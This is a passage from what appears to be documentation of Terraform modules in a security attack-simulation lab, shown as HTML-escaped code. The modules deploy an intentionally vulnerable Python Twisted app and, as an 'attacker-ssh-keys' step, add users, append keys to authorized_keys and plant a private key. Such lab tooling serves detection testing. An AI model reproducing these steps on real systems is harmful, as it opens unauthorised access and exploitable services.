url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    index&amp;&amp;#35;95;js&amp;&amp;#35;95;base64 = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/index&amp;#46;js&quot;,<br/>                &amp;&amp;#35;123;<br/>                    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-vulnerable-python3-twisted-app                    | ./modules/runbook/deploy-python3-twisted-app         | runbook_deploy_python3_twisted_app               | context.azure.runbook.vulnerable.python3_twisted_app              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;python3_twisted_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    screen &amp;#45;wipe<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    if command &amp;#45;v $PACKAGE&amp;&amp;#35;95;MANAGER &amp;&amp; $PACKAGE&amp;&amp;#35;95;MANAGER list &amp;#124; grep &quot;python3&amp;#45;twisted&quot; &amp;#124; grep &quot;18&amp;#46;9&amp;#46;0&amp;#45;11ubuntu0&amp;#46;20&amp;#46;04&quot;; then<br/>        mkdir &amp;#45;p /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app<br/>        cd /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;app&amp;&amp;#35;95;py&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; app&amp;#46;py<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;requirements&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; requirements&amp;#46;txt<br/>        log &quot;installing requirements&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        python3 &amp;#45;m pip install &amp;#45;r requirements&amp;#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>            screen &amp;#45;wipe<br/>            screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m python3 /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app/app&amp;#46;py<br/>            screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>            sleep 1800<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&amp;#45;twisted/focal&amp;#45;updates,focal&amp;#45;security,now 18&amp;#46;9&amp;#46;0&amp;#45;11ubuntu0&amp;#46;20&amp;#46;04&amp;#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl python3&amp;#45;pip&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl python3&amp;#45;pip&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    app&amp;&amp;#35;95;py = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/app&amp;#46;py&quot;,<br/>                &amp;&amp;#35;123;<br/>                    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    requirements = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/requirements&amp;#46;txt&quot;,<br/>                &amp;&amp;#35;123;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-ssh-keys                                        | ./modules/runbook/deploy-ssh-keys                    | runbook_deploy_secret_ssh_private                | context.azure.runbook.ssh_keys                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_keys&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;ssh_authorized_keys_path&quot;: &quot;/home/sshuser/.ssh/authorized_keys&quot;,<br/>                    &quot;ssh_private_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key&quot;,<br/>                    &quot;ssh_public_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key.pub&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>&amp;#35; ssh key<br/>resource &quot;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&quot; &quot;ssh&quot; &amp;&amp;#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&amp;&amp;#35;95;bits  = &quot;4096&quot;<br/>&amp;&amp;#35;125;<br/><br/>locals &amp;&amp;#35;123;<br/>    ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key = base64encode&amp;&amp;#35;40;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;#46;ssh&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;pem&amp;&amp;#35;41;<br/>    ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key = base64encode&amp;&amp;#35;40;chomp&amp;&amp;#35;40;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;#46;ssh&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;openssh&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>    ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    public&amp;&amp;#35;95;key&amp;&amp;#35;95;user = split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;1&amp;&amp;#35;93; == &quot;root&quot; ? &quot;root&quot; : split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;2&amp;&amp;#35;93;<br/>    private&amp;&amp;#35;95;key&amp;&amp;#35;95;user = split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;1&amp;&amp;#35;93; == &quot;root&quot; ? &quot;root&quot; : split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;2&amp;&amp;#35;93;<br/><br/>    payload&amp;&amp;#35;95;public = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    log &quot;adding user: $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password &quot;$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&quot; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; user already exists&quot;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    chown &amp;#45;R $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt;&gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    sort $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125; &amp;#124; uniq &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#46;uniq<br/>    mv $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#46;uniq $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chmod 600 $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chown &amp;#45;R $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    log &quot;public key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;authorized key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;public&amp;&amp;#35;95;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload&amp;&amp;#35;95;public<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    payload&amp;&amp;#35;95;private = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    log &quot;adding user: $&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password &quot;$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&quot; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; user already exists&quot;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chmod 600 $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chown $&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    log &quot;private key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;private&amp;&amp;#35;95;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload&amp;&amp;#35;95;private<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = 